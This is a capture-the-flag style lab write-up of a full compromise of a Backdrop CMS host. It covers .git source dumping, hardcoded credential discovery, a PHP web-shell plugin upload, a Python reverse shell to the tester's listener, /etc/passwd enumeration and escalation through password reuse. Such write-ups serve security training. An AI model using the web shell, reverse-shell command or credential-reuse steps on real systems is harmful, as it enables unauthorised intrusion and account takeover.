# 🧠 Git-Based Exploitation to Shell – Full Lab Writeup

This writeup outlines a complete kill chain starting from enumeration through a `.git` directory leak, leading to full shell access and credential reuse to escalate. It includes methodology, commands used, findings, and reasoning, formatted for clear reference and future replication.

---

## 🔍 Step 1: Port Enumeration

We began by scanning the target for open services using `nmap`.

```bash
nmap -sV 192.168.X.X
```

### 🔎 Results:
- `22/tcp` → SSH (Open)
- `80/tcp` → HTTP (Open)

This indicated a web application was running, as well as a potential SSH entry point. Our focus shifted to the HTTP port.

---

## 🌐 Step 2: Web Enumeration via FFUF

Using `ffuf`, we brute-forced common directories and files to discover hidden content on the web server.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.X.X/FUZZ
```

### 🧠 Discovery:
- `.git/` directory was exposed publicly.

This is a critical misconfiguration allowing us to potentially dump the entire source code of the web application.

---

## 🧰 Step 3: Dumping the Git Repository

We cloned and used a tool called [`git-dumper`](https://github.com/arthaud/git-dumper) to extract the full codebase from the `.git/` directory.

### Install & Run:
```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
python3 git-dumper.py http://192.168.X.X/.git/ dumpdir/
```

Once dumped, we navigated to the directory:

```bash
cd dumpdir
```

### Restore Files:
Files weren’t immediately visible. This was due to an empty working tree. To restore:

```bash
sudo git restore .
```

Now all project files were visible and searchable.

---

## 🔑 Step 4: Credential Discovery

Within the restored PHP application files, we found hardcoded credentials and config values.

### 🧾 Findings:
- **Usernames:** `dog`, `tiffany`
- **Passwords:** Located in a PHP config file

These credentials were valid for logging into the application’s admin interface.

---

## 🔐 Step 5: Backdrop CMS Admin Panel Access

We logged into the **Backdrop CMS** admin panel using the discovered credentials.

- URL: `http://192.168.X.X/?q=user/login`
- Credentials: (from PHP file)

Once authenticated, we enumerated the backend to determine the CMS version and available modules. One key module was a **plugin uploader**, which became our target for exploitation.

---

## 📦 Step 6: Weaponizing an Exploit

The CMS was determined to be vulnerable to **Backdrop CMS RCE via plugin upload**, documented on Exploit-DB:

📎 [Exploit 52021 – Backdrop CMS RCE](https://www.exploit-db.com/exploits/52021)

We cloned and modified the exploit to create a `.tar` plugin archive instead of a `.zip`, as the CMS only accepted `.tar` uploads.

### Payload Plugin (PHP):
```php
<?php
/*
Plugin Name: RevShell
*/
if (isset($_GET['cmd'])) {
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### Archive Creation:
```bash
tar -cf revshell.tar revshell.php
```

We uploaded this file via the plugin manager in the CMS admin portal.

---

## 🐚 Step 7: Reverse Shell Execution

After plugin activation, we triggered the payload via the browser to execute a reverse shell command.

### Python Reverse Shell Command:
```bash
python3.8 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.91",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

### Setup Listener:
```bash
nc -lvnp 4444
```

### Trigger via browser:
```
http://192.168.X.X/path/to/revshell.php?cmd=<encoded_payload>
```

We caught a shell as `www-data`, the default web service user.

---

## 🧭 Step 8: Post-Exploitation Enumeration

We began internal enumeration after catching the shell.

```bash
cat /etc/passwd
```

### 🧍 Users Discovered:
- `root`
- `jobert`
- `johncusack`

We searched for readable config files and sensitive data using:

```bash
find / -name '*.conf' 2>/dev/null
```

---

## 🧬 Step 9: Privilege Escalation via Password Reuse

Within a local config file, we found valid root-level database credentials:

```text
User: root  
Password: BackDropJ2024DS2024  
Host: 127.0.0.1  
Database: backdrop
```

We attempted logging in as other users (e.g., `johncusack`) using this password and succeeded:

```bash
su johncusack
Password: BackDropJ2024DS2024
```

At this point, we had escalated to a more privileged user. Depending on sudo permissions, we could easily pivot to root.

---

## ✅ Endgame Summary

| Phase             | Action / Tool                              | Result                                 |
|------------------|---------------------------------------------|----------------------------------------|
| Port Scan         | `nmap -sV`                                  | Discovered SSH & HTTP                  |
| Web Enum          | `ffuf`                                      | `.git/` exposed                        |
| Git Extraction    | `git-dumper` + `git restore .`              | Retrieved full codebase                |
| Credential Hunt   | Manual PHP config review                    | Found hardcoded creds                  |
| Admin Access      | Browser login to Backdrop CMS               | Backend access                         |
| Exploit Upload    | Modified Exploit-DB #52021 (.tar plugin)    | Plugin upload successful               |
| Shell Access      | Python reverse shell                        | Gained shell as `www-data`             |
| Enumeration       | `cat /etc/passwd` + `find`                  | Located users + config files           |
| Priv Escalation   | Reused root DB creds for user login         | Logged in as `johncusack`              |

---

## 🔚 Final Notes

This box reinforced the impact of:
- Improper `.git/` exposure
- Hardcoded credentials
- Insecure plugin upload mechanisms
- Password reuse across services

This end-to-end workflow can be easily repeated or adapted for similar CTFs or real-world pentests.

Let me know if you want a zipped `.md` export with images or want to extend this to include privilege escalation to full root.
